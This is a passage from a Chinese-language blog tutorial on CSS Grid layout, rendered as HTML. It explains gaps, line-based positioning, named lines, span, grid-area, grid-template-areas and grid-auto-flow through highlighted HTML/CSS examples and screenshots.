class="name">div</span>&gt;</span>9<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">row-gap</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508234733.png" alt="image.png|350"></p><p>例2，column-gap：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">column-gap</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508234918.png" alt="image.png|350"></p><blockquote><p>可以使用复合样式：gap: [行间距] [列间距]</p></blockquote><h1 id="5-定位-grid-row-grid-column"><a href="#5-定位-grid-row-grid-column" class="headerlink" title="5. 定位 grid-row grid-column"></a>5. 定位 grid-row grid-column</h1><p>在栅格化布局中，元素最外层的 div 容器负责划分区域，那么元素内层的 div 就为实体内容，我们可以根据划分好的网格将元素定位至网格的任意位置。</p><p>任意一个实体元素都必须为矩形，因此会拥有四条边，我们的定位依据就是由这四条边来决定的。一个实体元素的上边被称为 <code>grid-row-start</code>，下边被称为 <code>grid-row-end</code>，左边被称为 <code>grid-column-start</code>，右边被称为 <code>grid-column-end</code>。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200227172311.png" alt=""></p><p>当我们想要将其对其到某个位置时，只需要注明每条边对应到栅格的哪一条边即可，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">grid-row-start</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">grid-row-end</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-column-start</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">grid-column-end</span>: <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508235147.png" alt="image.png|350"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line"><span class="attribute">display</span>: grid;</span><br><span class="line"><span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line"><span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span> &gt; <span class="selector-tag">div</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: pink;</span><br><span class="line"><span class="attribute">grid-row-start</span>: <span class="number">2</span>;</span><br><span class="line"><span class="attribute">grid-row-end</span>: <span class="number">3</span>;</span><br><span class="line"><span class="attribute">grid-column-start</span>: <span class="number">2</span>;</span><br><span class="line"><span class="attribute">grid-column-end</span>: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508235424.png" alt="image.png|350"></p><p>此外布局的定位还可以使用分隔符 <code>/</code> 简写，分隔符的前后分别代表起始边与结束边，如上面的定位可以改写为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">grid-row</span>: <span class="number">1</span> / <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">1</span> / <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="6-布局命名"><a href="#6-布局命名" class="headerlink" title="6. 布局命名"></a>6. 布局命名</h1><p>在定义网格时，把网格线的名字写在方括号内，名字随意。我们先为容器的起点和终点命名，既包括行的，也包括列的。接下来再把处于网格中间的块的起点和终点命名为 <code>c-start</code> 和 <code>c-end</code>，也是包括行和列的。不一定要把全部网格线都命名，只需要为布局时用到的关键线命名即可。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: [r1-start] <span class="number">100px</span> [r1-end r2-start] <span class="number">100px</span> [r2-end r3-start] <span class="number">100px</span> [r3-end];</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: [c1-start] <span class="number">100px</span> [c1-end c2-start] <span class="number">100px</span> [c2-end c3-start] <span class="number">100px</span> [c3-end];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">grid-row-start</span>: r1-start;</span><br><span class="line">  <span class="attribute">grid-row-end</span>: r1-end;</span><br><span class="line">  <span class="attribute">grid-column-start</span>: c1-start;</span><br><span class="line">  <span class="attribute">grid-column-end</span>: c3-end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508235618.png" alt="image.png|350"></p><p>如果我们使用了 <code>repeat</code> 来创建边，那命名的方式稍有区别，在命名后使用该边时，要后缀时那一行或者哪一列的边：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, [r-start] <span class="number">1</span>fr [r-end]);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, [c-start] <span class="number">1</span>fr [c-end]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">grid-row-start</span>: r-start <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">grid-row-end</span>: r-end <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">grid-column-start</span>: c-start <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">grid-column-end</span>: c-end <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508235618.png" alt="image.png|350"></p><h1 id="7-偏移-span"><a href="#7-偏移-span" class="headerlink" title="7. 偏移 span"></a>7. 偏移 span</h1><p>在定位的过程中，如果确定了一条边之，可以使用 <code>span</code> 来对另一条边进行相对定位，如 <code>span 1</code> 代表着相对于上一条确定的边再偏移一条边。以下为具体示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">grid-row-start</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-row-end</span>: span <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">grid-column-start</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-column-end</span>: span <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240508235830.png" alt="image.png|350"></p><h1 id="8-区域定位-grid-area"><a href="#8-区域定位-grid-area" class="headerlink" title="8. 区域定位 grid-area"></a>8. 区域定位 grid-area</h1><p>除了使用 <code>grid-row</code>、<code>grid-column</code> 的定位方式之外，还可以使用 <code>grid-area</code> 区域定位的方式。区域定位分别代表上起始边、左起始边、下终边、右终边，其之间分别用 <code>/</code> 相间隔。</p><p>示例 1：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">grid-area</span>: <span class="number">1</span>/<span class="number">1</span>/<span class="number">2</span>/<span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20200228165058.png" alt=""></p><p>示例 2：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">grid-area</span>: <span class="number">1</span>/<span class="number">2</span>/<span class="number">3</span>/<span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20200228165341.png" alt=""></p><h1 id="9-区域命名-grid-template-areas"><a href="#9-区域命名-grid-template-areas" class="headerlink" title="9. 区域命名 grid-template-areas"></a>9. 区域命名 grid-template-areas</h1><p>可以使用 <code>grid-template-areas</code> 为区域进行命名，每行之间用不同的字符串相间隔，每列之间用空格相隔。</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span>&gt;</span>Header<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">nav</span>&gt;</span>Nav<span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span>&gt;</span>Main<span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">footer</span>&gt;</span>Footer<span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100vw</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="number">60px</span> <span class="number">1</span>fr <span class="number">60px</span>;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">100px</span> <span class="number">1</span>fr;</span><br><span class="line">  <span class="attribute">grid-template-areas</span>:</span><br><span class="line">    <span class="string">&quot;header header&quot;</span></span><br><span class="line">    <span class="string">&quot;nav main&quot;</span></span><br><span class="line">    <span class="string">&quot;footer footer&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span>,</span><br><span class="line"><span class="selector-tag">nav</span>,</span><br><span class="line"><span class="selector-tag">main</span>,</span><br><span class="line"><span class="selector-tag">footer</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: blueviolet;</span><br><span class="line">  <span class="attribute">background-clip</span>: content-box;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span> &#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: header;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> &#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: nav;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: main;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">footer</span>&#123;</span><br><span class="line">  <span class="attribute">grid-area</span>: footer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509000205.png" alt="image.png|650"></p><p>同时，使用 <code>grid-template-areas</code> 对栅格区域进行命名时，每条边也会自动被添加命名，以我们命名的 header 区域来说，其边的自动命名规则如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200228180003.png" alt=""></p><p>如果存在不想命名的区域，如上述示例中，我们只想命名最下区域的 footer 部分，可以使用占位符 <code>.</code> 来省略掉一个区域的命名，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="comment">/* ... ... */</span></span><br><span class="line">  <span class="attribute">grid-template-areas</span>:</span><br><span class="line">    <span class="string">&quot;. .&quot;</span></span><br><span class="line">    <span class="string">&quot;. .&quot;</span></span><br><span class="line">    <span class="string">&quot;footer footer&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="10-栅格的流动-grid-auto-flow"><a href="#10-栅格的流动-grid-auto-flow" class="headerlink" title="10. 栅格的流动 grid-auto-flow"></a>10. 栅格的流动 grid-auto-flow</h1><p>栅格的默认流动方式为从左到右从上到下，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509000422.png" alt="image.png|350"></p><p><code>grid-auto-flow</code> 可以改变栅格的浮动方向，默认值为 <code>row</code> 改为 <code>column</code> 之后可以沿着列的方向浮动：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">grid-auto-flow</span>: column</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509000441.png" alt="image.png|350"></p><p>此外，<code>grid-auto-flow</code> 属性值的第二个值可以填写 <code>dense</code> 指定填充的位置修改为如果最后一个定位元素前还有空位，那就填充到其前方。</p><p>如下是不加 <code>dense</code> 的情况:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> <span class="selector-pseudo">:nth-child</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">1</span>/span <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> <span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">2</span>/span <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509000557.png" alt="image.png|350"></p><p>添加 <code>dense</code> 后：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">grid-auto-flow</span>: row dense;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> <span class="selector-pseudo">:nth-child</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">1</span>/span <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> <span 